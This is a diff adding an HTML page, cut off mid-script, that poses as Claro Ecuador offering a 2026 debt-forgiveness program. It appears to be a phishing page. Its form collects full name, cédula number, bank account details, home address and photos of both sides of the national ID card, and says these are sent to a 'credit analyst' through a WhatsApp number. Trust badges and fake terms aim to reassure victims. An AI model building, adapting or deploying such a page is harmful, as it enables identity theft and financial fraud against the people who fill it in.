@@ -1,0 +1,1309 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Condonacion Claro</title>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Poppins', sans-serif;
+    }
+
+    body {
+      background: #f5f7fb;
+      color: #111827;
+    }
+
+    /* HEADER */
+    header {
+      background: linear-gradient(135deg, #d60000, #ff3b3b);
+      color: white;
+      padding: 20px 8%;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+
+    .header-container {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      max-width: 1400px;
+      margin: 0 auto;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      font-size: 1.2rem;
+      font-weight: 700;
+    }
+
+    .logo-img {
+      width: 52px;
+      height: 52px;
+      border-radius: 50%;
+      overflow: hidden;
+      background: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.12);
+    }
+
+    .logo-img img {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+
+    .text-shadow {
+      text-transform: uppercase;
+      text-shadow: 2px 2px 8px rgba(0,0,0,0.25);
+      font-weight: 800;
+    }
+
+    nav {
+      display: flex;
+      gap: 30px;
+    }
+
+    nav a {
+      color: white;
+      text-decoration: none;
+      font-weight: 500;
+      transition: 0.3s ease;
+    }
+
+    nav a:hover {
+      opacity: 0.8;
+    }
+
+    /* HERO SECTION */
+    .hero-section {
+      background: radial-gradient(circle at top left, rgba(255,255,255,0.18), transparent 30%),
+                  linear-gradient(180deg, #e60000 0%, #b60000 100%);
+      color: white;
+      padding: 80px 8% 90px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .hero-section::before {
+      content: '';
+      position: absolute;
+      width: 520px;
+      height: 520px;
+      background: rgba(255,255,255,0.08);
+      border-radius: 50%;
+      top: -200px;
+      right: -140px;
+      filter: blur(4px);
+    }
+
+    .hero {
+      display: grid;
+      grid-template-columns: repeat(12, 1fr);
+      gap: 30px;
+      position: relative;
+      z-index: 1;
+      max-width: 1400px;
+      margin: 0 auto;
+    }
+
+    .hero-text {
+      grid-column: 1 / span 7;
+      max-width: 700px;
+    }
+
+    .hero-visual {
+      grid-column: 8 / span 5;
+      min-height: 380px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+    }
+
+    .hero-headline {
+      font-size: 3.2rem;
+      line-height: 1.05;
+      margin-bottom: 20px;
+      letter-spacing: -0.04em;
+    }
+
+    .highlights {
+      max-width: 1400px;
+      margin: 0 auto;
+      padding: 40px 8%;
+    }
+
+    .highlights-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 20px;
+    }
+
+    .highlight-card {
+      background: white;
+      border-radius: 22px;
+      padding: 26px;
+      box-shadow: 0 12px 30px rgba(0,0,0,0.06);
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 14px;
+    }
+
+    .highlight-icon {
+      width: 62px;
+      height: 62px;
+      border-radius: 50%;
+      background: #fee2e2;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.6rem;
+      color: #d60000;
+      box-shadow: 0 12px 25px rgba(214,0,0,0.12);
+    }
+
+    .highlight-card h4 {
+      margin: 0;
+      font-size: 1rem;
+      font-weight: 700;
+      color: #111827;
+    }
+
+    .highlight-card p {
+      margin: 0;
+      color: #6b7280;
+      line-height: 1.7;
+      font-size: 0.95rem;
+    }
+
+    .hero-subtitle {
+      font-size: 1.1rem;
+      margin-bottom: 30px;
+      opacity: 0.95;
+      line-height: 1.7;
+      max-width: 520px;
+    }
+
+    .hero-badge {
+      display: inline-block;
+      background: rgba(255,255,255,0.15);
+      border: 1px solid rgba(255,255,255,0.35);
+      border-radius: 999px;
+      padding: 10px 18px;
+      font-weight: 700;
+      margin-bottom: 24px;
+    }
+
+    .hero-cta {
+      display: inline-flex;
+      align-items: center;
+      gap: 12px;
+      background: white;
+      color: #d60000;
+      padding: 16px 28px;
+      border-radius: 999px;
+      font-weight: 700;
+      text-decoration: none;
+      box-shadow: 0 16px 30px rgba(0,0,0,0.16);
+      transition: transform 0.3s ease;
+    }
+
+    .hero-cta:hover {
+      transform: translateY(-2px);
+    }
+
+    .hero-image-card {
+      width: 100%;
+      border-radius: 28px;
+      overflow: hidden;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.18);
+      background: linear-gradient(180deg, rgba(255,255,255,0.08), rgba(255,255,255,0.05));
+      position: relative;
+      padding: 30px;
+      display: grid;
+      grid-template-columns: 1fr;
+      align-items: center;
+      justify-items: center;
+      gap: 20px;
+    }
+
+    .hero-image-card::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: radial-gradient(circle at top right, rgba(255,255,255,0.25), transparent 35%);
+      pointer-events: none;
+    }
+
+    .hero-image-card img {
+      width: 100%;
+      height: auto;
+      max-width: 420px;
+      object-fit: contain;
+      border-radius: 22px;
+      z-index: 1;
+    }
+
+    .hero-discount {
+      position: relative;
+      background: rgba(255,255,255,0.15);
+      color: white;
+      border: 1px solid rgba(255,255,255,0.35);
+      padding: 16px 20px;
+      border-radius: 18px;
+      font-weight: 700;
+      text-align: center;
+      box-shadow: 0 12px 30px rgba(0,0,0,0.18);
+      z-index: 1;
+      width: fit-content;
+      margin: 0 auto;
+    }
+
+    .hero-discount span {
+      display: block;
+      font-size: 2.2rem;
+      line-height: 1;
+    }
+
+    .btn {
+      display: inline-block;
+      background: white;
+      color: #d60000;
+      padding: 14px 28px;
+      border-radius: 12px;
+      text-decoration: none;
+      font-weight: 600;
+      transition: 0.3s ease;
+      cursor: pointer;
+      border: none;
+      font-size: 1rem;
+    }
+
+    .btn:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 12px 25px rgba(0,0,0,0.15);
+    }
+
+    .btn-secondary {
+      background: #d60000;
+      color: white;
+    }
+
+    section {
+      padding: 70px 8%;
+      max-width: 1400px;
+      margin: 0 auto;
+    }
+
+    .section-title {
+      text-align: center;
+      margin-bottom: 50px;
+    }
+
+    .section-title h2 {
+      font-size: 2.2rem;
+      color: #d60000;
+      margin-bottom: 10px;
+    }
+
+    .section-title p {
+      font-size: 1.1rem;
+      color: #6b7280;
+    }
+
+    .cards {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 25px;
+    }
+
+    .card {
+      background: white;
+      border-radius: 22px;
+      padding: 30px;
+      box-shadow: 0 8px 25px rgba(0,0,0,0.06);
+      transition: 0.3s ease;
+    }
+
+    .card:hover {
+      transform: translateY(-6px);
+      box-shadow: 0 12px 35px rgba(0,0,0,0.1);
+    }
+
+    .card h3 {
+      color: #d60000;
+      margin-bottom: 15px;
+      font-size: 1.5rem;
+    }
+
+    .price {
+      font-size: 2rem;
+      font-weight: 700;
+      margin-bottom: 15px;
+    }
+
+    .card ul {
+      list-style: none;
+      line-height: 2;
+      color: #4b5563;
+    }
+
+    /* PLAN CARD PREMIUM */
+    .plan-card-premium {
+      background: linear-gradient(135deg, #fff9f5, #fff);
+      border: 2px solid #d60000;
+      position: relative;
+    }
+
+    .plan-badge {
+      position: absolute;
+      top: -12px;
+      left: 20px;
+      background: linear-gradient(135deg, #d60000, #ff3b3b);
+      color: white;
+      padding: 6px 15px;
+      border-radius: 20px;
+      font-size: 0.8rem;
+      font-weight: 700;
+    }
+
+    .plan-card-premium h3 {
+      margin-top: 15px;
+      margin-bottom: 20px;
+      font-size: 1.3rem;
+      line-height: 1.3;
+    }
+
+    .plan-highlight {
+      background: linear-gradient(135deg, #d60000, #ff3b3b);
+      color: white;
+      padding: 20px;
+      border-radius: 15px;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    .price-big {
+      font-size: 2.5rem;
+      font-weight: 700;
+      margin: 10px 0;
+    }
+
+    .plan-list {
+      list-style: none;
+      margin-bottom: 20px;
+    }
+
+    .plan-list li {
+      line-height: 2;
+      color: #4b5563;
+      font-size: 0.95rem;
+      padding: 5px 0;
+    }
+
+    .plan-promo {
+      background: #fff5f5;
+      border: 2px dashed #d60000;
+      border-radius: 12px;
+      padding: 15px;
+      text-align: center;
+      color: #d60000;
+      font-weight: 700;
+      margin-top: 15px;
+    }
+
+    .plan-promo p {
+      margin: 0;
+      font-size: 0.9rem;
+    }
+
+    .plan-image {
+      border-radius: 18px;
+      overflow: hidden;
+      margin-bottom: 20px;
+      box-shadow: 0 10px 20px rgba(0,0,0,0.08);
+    }
+
+    .plan-image img {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+
+    .apply-btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      padding: 14px 18px;
+      border-radius: 14px;
+      background: #d60000;
+      color: white;
+      font-weight: 700;
+      text-decoration: none;
+      transition: 0.3s ease;
+      margin-top: 15px;
+    }
+
+    .apply-btn:hover {
+      background: #b80000;
+      transform: translateY(-2px);
+    }
+
+    .finance-box {
+      background: linear-gradient(135deg, #111827, #1f2937);
+      color: white;
+      border-radius: 30px;
+      padding: 50px;
+      text-align: center;
+    }
+
+    .finance-box h2 {
+      font-size: 2.4rem;
+      margin-bottom: 20px;
+    }
+
+    .finance-box p {
+      max-width: 800px;
+      margin: auto;
+      line-height: 1.8;
+      opacity: 0.95;
+    }
+
+    /* FORM STYLES */
+    .form-container {
+      background: white;
+      border-radius: 30px;
+      padding: 50px;
+      box-shadow: 0 8px 30px rgba(0,0,0,0.08);
+    }
+
+    form {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+      gap: 20px;
+    }
+
+    .full {
+      grid-column: 1 / -1;
+    }
+
+    .form-group {
+      display: flex;
+      flex-direction: column;
+    }
+
+    label {
+      font-weight: 600;
+      margin-bottom: 8px;
+      color: #111827;
+      font-size: 0.95rem;
+    }
+
+    .required {
+      color: #d60000;
+    }
+
+    input,
+    textarea,
+    select {
+      width: 100%;
+      padding: 15px;
+      border-radius: 12px;
+      border: 1px solid #d1d5db;
+      outline: none;
+      font-size: 1rem;
+      font-family: 'Poppins', sans-serif;
+      transition: 0.3s ease;
+    }
+
+    input:focus,
+    textarea:focus,
+    select:focus {
+      border-color: #d60000;
+      background: #fff5f5;
+    }
+
+    .file-input-wrapper {
+      position: relative;
+      display: inline-block;
+      width: 100%;
+    }
+
+    .file-input-label {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      padding: 30px;
+      border: 2px dashed #d1d5db;
+      border-radius: 12px;
+      background: #f9fafb;
+      cursor: pointer;
+      transition: 0.3s ease;
+    }
+
+    .file-input-label:hover {
+      border-color: #d60000;
+      background: #fff5f5;
+    }
+
+    .file-input-label input {
+      display: none;
+    }
+
+    .submit-btn {
+      background: #d60000;
+      color: white;
+      border: none;
+      padding: 16px;
+      border-radius: 14px;
+      font-size: 1rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: 0.3s ease;
+      width: 100%;
+    }
+
+    .submit-btn:hover {
+      background: #b80000;
+      transform: translateY(-2px);
+    }
+
+    /* TERMS SECTION */
+    .terms-section {
+      background: #f9fafb;
+      border-radius: 20px;
+      padding: 40px;
+      margin: 40px 0;
+    }
+
+    .terms-section h3 {
+      color: #d60000;
+      margin-bottom: 15px;
+      font-size: 1.3rem;
+    }
+
+    .terms-section p {
+      line-height: 1.8;
+      color: #4b5563;
+      margin-bottom: 12px;
+    }
+
+    .checkbox-group {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      margin-top: 20px;
+    }
+
+    .checkbox-group input[type="checkbox"] {
+      width: 20px;
+      height: 20px;
+      margin-top: 2px;
+      cursor: pointer;
+    }
+
+    .checkbox-group label {
+      margin: 0;
+      font-weight: 500;
+      font-size: 0.95rem;
+    }
+
+    /* MODAL */
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0,0,0,0.5);
+      overflow-y: auto;
+    }
+
+    .modal-content {
+      background-color: white;
+      margin: 5% auto;
+      padding: 30px;
+      border-radius: 20px;
+      width: 90%;
+      max-width: 600px;
+      max-height: 80vh;
+      overflow-y: auto;
+    }
+
+    .close {
+      color: #aaa;
+      float: right;
+      font-size: 28px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: 0.3s ease;
+    }
+
+    .close:hover {
+      color: #d60000;
+    }
+
+    .modal h2 {
+      color: #d60000;
+      margin-bottom: 20px;
+    }
+
+    /* FOOTER */
+    footer {
+      background: #111827;
+      color: white;
+      text-align: center;
+      padding: 30px;
+      margin-top: 50px;
+    }
+
+    .whatsapp {
+      position: fixed;
+      right: 20px;
+      bottom: 20px;
+      min-width: 140px;
+      padding: 14px 18px;
+      border-radius: 999px;
+      background: #25D366;
+      color: white;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      text-decoration: none;
+      font-weight: 700;
+      box-shadow: 0 12px 30px rgba(0,0,0,0.18);
+      z-index: 999;
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+    }
+
+    .whatsapp:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 16px 35px rgba(0,0,0,0.25);
+    }
+
+    .contact-strip {
+      background: #fcefee;
+      border-radius: 28px;
+      padding: 28px 30px;
+      margin: 30px 0;
+    }
+
+    .contact-strip-inner {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      max-width: 1100px;
+      margin: 0 auto;
+    }
+
+    .contact-strip-inner p {
+      margin: 0;
+      color: #991b1b;
+      font-weight: 600;
+      flex: 1 1 320px;
+    }
+
+    .contact-strip-inner .hero-cta {
+      margin: 0;
+    }
+
+    .whatsapp img {
+      width: 20px;
+      height: 20px;
+    }
+
+    .alert {
+      padding: 15px;
+      margin-bottom: 20px;
+      border-radius: 12px;
+      font-weight: 500;
+    }
+
+    .alert-success {
+      background: #d1fae5;
+      color: #065f46;
+      border: 1px solid #6ee7b7;
+    }
+
+    .alert-error {
+      background: #fee2e2;
+      color: #7f1d1d;
+      border: 1px solid #fca5a5;
+    }
+
+    .alert-info {
+      background: #dbeafe;
+      color: #1e40af;
+      border: 1px solid #93c5fd;
+    }
+
+    @media (max-width: 1024px) {
+      .hero {
+        grid-template-columns: 1fr;
+      }
+
+      .hero-text,
+      .hero-visual {
+        grid-column: 1 / -1;
+      }
+
+      .hero-headline {
+        font-size: 2.8rem;
+      }
+
+      .hero-subtitle {
+        max-width: 100%;
+      }
+
+      .cards {
+        grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      }
+
+      nav {
+        justify-content: center;
+      }
+    }
+
+    @media (max-width: 768px) {
+      header {
+        padding: 18px 6%;
+      }
+
+      .header-container {
+        flex-direction: column;
+        align-items: flex-start;
+        gap: 18px;
+      }
+
+      nav {
+        gap: 12px;
+        font-size: 0.9rem;
+        flex-wrap: wrap;
+      }
+
+      .hero {
+        gap: 24px;
+      }
+
+      .hero-headline {
+        font-size: 2.2rem;
+      }
+
+      .hero-subtitle {
+        font-size: 1rem;
+      }
+
+      .hero-image-card {
+        padding: 20px;
+      }
+
+      .hero-discount {
+        width: 100%;
+      }
+
+      .highlights,
+      .finance-box,
+      .form-container,
+      .terms-section,
+      .contact-strip {
+        padding: 24px;
+      }
+
+      .cards {
+        grid-template-columns: 1fr;
+      }
+
+      .contact-strip-inner {
+        flex-direction: column;
+        align-items: stretch;
+      }
+
+      .contact-strip-inner .hero-cta {
+        width: 100%;
+      }
+
+      .form-container {
+        padding: 24px;
+      }
+
+      .section-title h2 {
+        font-size: 1.8rem;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- HEADER -->
+  <header>
+    <div class="header-container">
+      <div class="logo">
+        <div class="logo-img">
+          <img src="logo-claro.jpg" alt="Claro logo">
+        </div>
+        <span><span class="text-shadow">CLARO ECUADOR</span></span>
+      </div>
+      <nav>
+        <a href="#planes">Planes</a>
+        <a href="#condonacion">Condonación</a>
+        <a href="#formulario">Solicitar</a>
+        <a href="#terminos" onclick="openTerms()">Términos</a>
+        <a href="https://wa.me/593963144434?text=Deseo%20mas%20informacion" target="_blank">Soporte</a>
+      </nav>
+    </div>
+  </header>
+
+  <!-- HERO SECTION -->
+  <section class="hero-section">
+    <div class="hero">
+      <div class="hero-text">
+        <span class="hero-badge">Condonación Especial</span>
+        <h1 class="hero-headline">Condonación y Financiación Claro Ecuador</h1>
+        <p class="hero-subtitle">
+          Aplica ahora al programa de condonación de deuda y accede a planes Claro Hogar con soporte directo por WhatsApp.
+        </p>
+        <a href="#formulario" class="hero-cta">Solicitar Condonación</a>
+      </div>
+      <div class="hero-visual">
+        <div class="hero-image-card">
+          <img src="hogar.jpg" alt="Promoción Claro" loading="lazy">
+          <div class="hero-discount">
+            HASTA
+            <span>30%</span>
+            DE DCTO.
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="highlights">
+    <div class="highlights-grid">
+      <div class="highlight-card">
+        <div class="highlight-icon">🔒</div>
+        <h4>Seguro y confidencial</h4>
+        <p>Tu información se maneja con privacidad y protección total.</p>
+      </div>
+      <div class="highlight-card">
+        <div class="highlight-icon">⏱️</div>
+        <h4>30 min respuesta inmediata</h4>
+        <p>Recibe una respuesta rápida por WhatsApp en menos de 30 minutos.</p>
+      </div>
+      <div class="highlight-card">
+        <div class="highlight-icon">💸</div>
+        <h4>Sin costo de aplicación</h4>
+        <p>El proceso es totalmente gratuito y sin pagos extras.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- PLANES SECTION -->
+  <section id="planes">
+    <div class="section-title">
+      <h2>Planes Disponibles</h2>
+      <p>Conoce los beneficios móviles disponibles actualmente en Claro Ecuador.</p>
+    </div>
+
+    <div class="cards">
+      <!-- PLAN FAMILIA -->
+      <div class="card plan-card-premium">
+        <div class="plan-image">
+          <img src="18+imp.jpg" alt="Mamá y Papá se Cambian a Claro" loading="lazy">
+        </div>
+        <div class="plan-badge">PLAN FAMILIA</div>
+        <h3>Internet para el hogar y control total</h3>
+        <div class="plan-highlight">
+          <p style="font-size: 0.9rem; margin-bottom: 10px;">Ideal para hasta 5 dispositivos, redes sociales y video HD.</p>
+          <div class="price-big">$18<span style="font-size: 0.7rem;">/mes +IVA</span></div>
+        </div>
+        <ul class="plan-list">
+          <li>📱 30 GIGAS TOTALES</li>
+          <li>🔓 20 GIGAS LIBRES</li>
+          <li>📲 Redes ilimitadas: Instagram, TikTok, Facebook, WhatsApp, X</li>
+          <li>☎️ Llamadas ilimitadas a Claro</li>
+          <li>✈️ WhatsApp dentro y fuera del país</li>
+        </ul>
+        <div class="plan-promo">
+          <p>✨ 15% DESCUENTO + 5 GIGAS</p>
+          <p>POR 3 MESES</p>
+        </div>
+        <a href="#formulario" class="apply-btn">Aplicar</a>
+      </div>
+
+      <!-- PLAN CAMPEÓN -->
+      <div class="card plan-card-premium">
+        <div class="plan-image">
+          <img src="14+imp.jpg" alt="Conexión estable para trabajo y estudio" loading="lazy">
+        </div>
+        <div class="plan-badge">PLAN CAMPEÓN</div>
+        <h3>Conexión estable para trabajo y estudio</h3>
+        <div class="plan-highlight">
+          <p style="font-size: 0.9rem; margin-bottom: 10px;">Perfecto para videollamadas, clases online y entretenimiento sin cortes.</p>
+          <div class="price-big">$14<span style="font-size: 0.7rem;">/mes +IVA</span></div>
+        </div>
+        <ul class="plan-list">
+          <li>📱 38 GIGAS TOTALES</li>
+          <li>🔓 18 GIGAS LIBRES</li>
+          <li>💬 WhatsApp + redes sociales sin consumir la cuota</li>
+          <li>☎️ Llamadas ilimitadas a Claro</li>
+          <li>📲 Todo por $14 + IMP</li>
+        </ul>
+        <div class="plan-promo">
+          <p>✨ 15% DESCUENTO + 5 GIGAS</p>
+          <p>POR 3 MESES</p>
+        </div>
+        <a href="#formulario" class="apply-btn">Aplicar</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- CONDONACION SECTION -->
+  <section id="condonacion">
+    <div class="finance-box">
+      <h2>✓ Requisitos del Programa</h2>
+      <p>
+        Solo deudas con antigüedad mayor a 12 meses aplican. Verifica que cumplas con los requisitos: ser ciudadano ecuatoriano, mayor de edad, con cédula vigente, cuenta bancaria a tu nombre y correo electrónico válido. La aplicación es completamente gratuita. Claro Ecuador nunca solicita pagos previos.
+      </p>
+    </div>
+  </section>
+
+  <!-- FORMULARIO SECTION -->
+  <section id="formulario">
+    <div class="section-title">
+      <h2>Formulario de Solicitud</h2>
+      <p>Completa todos los campos obligatorios. Solo deudas con antigüedad mayor a un año aplican al programa.</p>
+    </div>
+
+    <div class="form-container">
+      <div id="alertContainer"></div>
+
+      <form id="condonacionForm">
+        <!-- FILA 1 -->
+        <div class="form-group">
+          <label for="nombre">Nombre Completo <span class="required">*</span></label>
+          <input type="text" id="nombre" placeholder="Ej. Juan Carlos Pérez Andrade" required>
+        </div>
+
+        <div class="form-group">
+          <label for="cedula">Cédula <span class="required">*</span></label>
+          <input type="text" id="cedula" placeholder="1712345678" required>
+        </div>
+
+        <div class="form-group">
+          <label for="email">Correo Electrónico <span class="required">*</span></label>
+          <input type="email" id="email" placeholder="ejemplo@correo.com" required>
+        </div>
+
+        <!-- FILA 2 -->
+        <div class="form-group">
+          <label for="numeroCuenta">Número de Cuenta Bancaria <span class="required">*</span></label>
+          <input type="text" id="numeroCuenta" placeholder="Solo números" required>
+        </div>
+
+        <div class="form-group">
+          <label for="banco">Nombre del Banco <span class="required">*</span></label>
+          <input type="text" id="banco" placeholder="Ej. Banco Pichincha" required>
+        </div>
+
+        <!-- FILA 3 -->
+        <div class="form-group">
+          <label for="tipoCuenta">Tipo de Cuenta <span class="required">*</span></label>
+          <select id="tipoCuenta" required>
+            <option value="">Selecciona una opción</option>
+            <option>Ahorros</option>
+            <option>Corriente</option>
+            <option>Otra</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label for="plan">Plan Claro Contratado <span class="required">*</span></label>
+          <select id="plan" required>
+            <option value="">Selecciona tu plan</option>
+            <option>POSTPAGO</option>
+            <option>FIJO</option>
+          </select>
+        </div>
+
+        <!-- FILA 4 -->
+        <div class="form-group full">
+          <label for="direccion">Dirección de Domicilio <span class="required">*</span></label>
+          <input type="text" id="direccion" placeholder="Calle, número, sector" required>
+        </div>
+        <div class="form-group full">
+          <label for="ciudad">Ciudad / Provincia <span class="required">*</span></label>
+          <input type="text" id="ciudad" placeholder="Ej: Quito, Guayaquil, Cuenca" required>
+        </div>
+
+        <!-- CÉDULA FRONTAL -->
+        <div class="form-group full">
+          <label for="cedulaFrontal">Cédula (Frontal) <span class="required">*</span></label>
+          <div class="file-input-wrapper">
+            <label class="file-input-label" for="cedulaFrontal">
+              <input type="file" id="cedulaFrontal" accept="image/*" required>
+              <span>📷 Subir foto frontal de cédula</span>
+            </label>
+            <small style="display: block; margin-top: 8px; color: #6b7280;">Formato: JPG, PNG (máx. 5MB)</small>
+          </div>
+        </div>
+
+        <!-- CÉDULA REVERSO -->
+        <div class="form-group full">
+          <label for="cedulaReverso">Cédula (Reverso) <span class="required">*</span></label>
+          <div class="file-input-wrapper">
+            <label class="file-input-label" for="cedulaReverso">
+              <input type="file" id="cedulaReverso" accept="image/*" required>
+              <span>📷 Subir foto reverso de cédula</span>
+            </label>
+            <small style="display: block; margin-top: 8px; color: #6b7280;">Formato: JPG, PNG (máx. 5MB)</small>
+          </div>
+        </div>
+
+        <!-- COMENTARIO -->
+        <div class="form-group full">
+          <label for="comentario">Comentario Adicional</label>
+          <textarea id="comentario" rows="4" placeholder="Información adicional que desees compartir"></textarea>
+        </div>
+
+        <!-- TERMS -->
+        <div class="form-group full">
+          <div class="terms-section">
+            <h3>📋 Términos y Condiciones</h3>
+            <p><strong>Programa de Condonación de Deuda 2026 — Claro Ecuador</strong></p>
+            <p>✓ Aplica únicamente a clientes con deudas mayores a 12 meses de antigüedad.</p>
+            <p>✓ La aplicación es gratuita. Claro nunca solicita pagos previos.</p>
+            <p>✓ Debes ser ciudadano ecuatoriano, mayor de edad, con cédula vigente.</p>
+            <p>✓ Datos falsos resultarán en rechazo automático.</p>
+            <p>✓ Respuesta en máximo 30 minutos por WhatsApp.</p>
+            <p style="margin-top: 15px; font-size: 0.9rem;">
+              Tus datos personales se tratan conforme a la Ley de Protección de Datos Personales del Ecuador.
+              <a href="#terminos" onclick="openTerms(); return false;" style="color: #d60000; font-weight: 600;">Ver términos completos</a>
+            </p>
+
+            <div class="checkbox-group">
+              <input type="checkbox" id="aceptoTerminos" required>
+              <label for="aceptoTerminos">Acepto los Términos y Condiciones del Programa de Condonación 2026 y autorizo el tratamiento de mis datos personales por parte de Claro Ecuador.</label>
+            </div>
+          </div>
+        </div>
+
+        <!-- SUBMIT -->
+        <button type="submit" class="submit-btn full">
+          🚀 Enviar Solicitud al Analista de Crédito
+        </button>
+
+        <div class="form-group full">
+          <p style="text-align: center; font-size: 0.9rem; color: #6b7280; margin-top: 10px;">
+            ℹ️ Tu solicitud y fotos serán enviadas al departamento de crédito por WhatsApp. Tus datos están protegidos.
+          </p>
+        </div>
+      </form>
+    </div>
+  </section>
+
+  <section class="contact-strip">
+    <div class="contact-strip-inner">
+      <p>¿Dudas sobre tu condonación? Escríbenos por WhatsApp o revisa los términos completos antes de enviar.</p>
+      <a href="https://wa.me/593963144434?text=Hola%20Claro%2C%20quiero%20mi%20condonaci%C3%B3n" class="hero-cta" target="_blank" rel="noopener noreferrer">Ir a WhatsApp</a>
+    </div>
+  </section>
+
+  <!-- TERMS MODAL -->
+  <div id="termsModal" class="modal">
+    <div class="modal-content">
+      <span class="close" onclick="closeTerms()">&times;</span>
+      <h2>Términos y Condiciones Completos</h2>
+      
+      <h3 style="color: #d60000; margin-top: 20px; margin-bottom: 10px;">Programa de Condonación de Deuda 2026 — Claro Ecuador</h3>
+      
+      <div style="line-height: 1.8; color: #4b5563;">
+        <p><strong>1. Eligibilidad</strong></p>
+        <p>El Programa de Condonación 2026 aplica únicamente a clientes con deudas mayores a doce (12) meses de antigüedad registradas a nombre del titular.</p>
+
+        <p style="margin-top: 15px;"><strong>2. Costo de Aplicación</strong></p>
+        <p>La aplicación al programa es gratuita. Claro Ecuador nunca solicitará pagos, recargas o transferencias para procesar tu solicitud.</p>
+
+        <p style="margin-top: 15px;"><strong>3. Requisitos del Solicitante</strong></p>
+        <p>El solicitante debe ser ciudadano ecuatoriano, mayor de edad, con cédula vigente y cuenta bancaria a nombre propio.</p>
+
+        <p style="margin-top: 15px;"><strong>4. Verificación de Datos</strong></p>
+        <p>La información proporcionada será verificada con la base oficial de clientes. Datos falsos o inexactos podrán resultar en el rechazo automático de la solicitud.</p>
+
+        <p style="margin-top: 15px;"><strong>5. Tiempo de Respuesta</strong></p>
+        <p>La respuesta oficial será notificada en un plazo máximo de 30 minutos por el canal de WhatsApp habilitado para el programa.</p>
+
+        <p style="margin-top: 15px;"><strong>6. Protección de Datos Personales</strong></p>
+        <p>Tus datos personales serán tratados de conformidad con la Ley Orgánica de Protección de Datos Personales del Ecuador y utilizados exclusivamente para los fines de este programa.</p>
+
+        <p style="margin-top: 15px;"><strong>7. Modificaciones del Programa</strong></p>
+        <p>Claro Ecuador se reserva el derecho de modificar o finalizar el programa en cualquier momento, previa comunicación a sus clientes.</p>
+
+      </div>
+    </div>
+  </div>
+
+  <!-- FOOTER -->
+  <footer>
+    <p>
+      © 2026 Claro Ecuador. Todos los derechos reservados.
+    </p>
+  </footer>
+
+  <!-- WHATSAPP BUTTON -->
+  <a
+    class="whatsapp"
+    href="https://wa.me/593963144434?text=Deseo%20mas%20informacion%20sobre%20el%20Programa%20de%20Condonacion%202026"
+    target="_blank"
+    title="Soporte WhatsApp"
+  >
+    <img src="https://cdn-icons-png.flaticon.com/512/733/733585.png" alt="WhatsApp">
+    <span>Soporte</span>
+  </a>
+
+  <script>
+    // MODAL FUNCTIONS
+    const modal = document.getElementById('termsModal');
+
+    function openTerms() {
+      modal.style.display = 'block';
+      document.body.style.overflow = 'hidden';
+    }
+
+    function closeTerms() {
+      modal.style.display = 'none';
+      document.body.style.overflow = 'auto';
+    }
+
+    window.onclick = function(event) {
+      if (event.target == modal) {
+        closeTerms();
+      }
+    }
+
+    // FORM SUBMISSION
+    document.getElementById('condonacionForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      // VALIDACIONES
+      const nombre = document.getElementById('nombre').value.trim();
+      const cedula = document.getElementById('cedula').value.trim();
+      const email = document.getElementById('email').value.trim();
+      const numeroCuenta = document.getElementById('numeroCuenta').value.trim();
+      const banco = document.getElementById('banco').value.trim();
+      const tipoCuenta = document.getElementById('tipoCuenta').value;
+      const plan = document.getElementById('plan').value;
+      const direccion = document.getElementById('direccion').value.trim();
+      const cedulaFrontal = document.getElementById('cedulaFrontal').files[0];
+      const cedulaReverso = document.getElementById('cedulaReverso').files[0];
+      const aceptoTerminos = document.getElementById('aceptoTerminos').checked;
+
+      const alertContainer = document.getElementById('alertContainer');
+
+      if (!aceptoTerminos) {
+        alertContainer.innerHTML = '<div class="alert alert-error">❌ Debes aceptar los Términos y Condiciones.</div>';
+        return;
+      }
+
+      if (!cedulaFrontal || !cedulaReverso) {
